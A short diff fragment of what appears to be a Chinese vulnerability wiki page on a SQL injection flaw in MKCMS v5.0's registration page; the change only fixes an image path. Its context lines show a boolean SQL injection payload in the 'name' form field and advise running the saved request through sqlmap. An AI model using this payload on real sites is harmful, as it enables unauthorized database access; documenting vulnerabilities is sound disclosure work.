@@ -50,7 +50,7 @@ POC：
 
     name=test' AND 1=1 AND 'inject'='inject&email=sss%40qq.com&password=ssssss&submit=
 
-![](/Users/aresx/Documents/VulWiki/.resource/MKCMSv5.0_ucenter_reg.php前台注入漏洞/media/rId24.jpg)
+![](./.resource/MKCMSv5.0_ucenter_reg.php前台注入漏洞/media/rId24.jpg)
 
 将POC中的数据包保存下来丢给sqlmap跑即可。
 
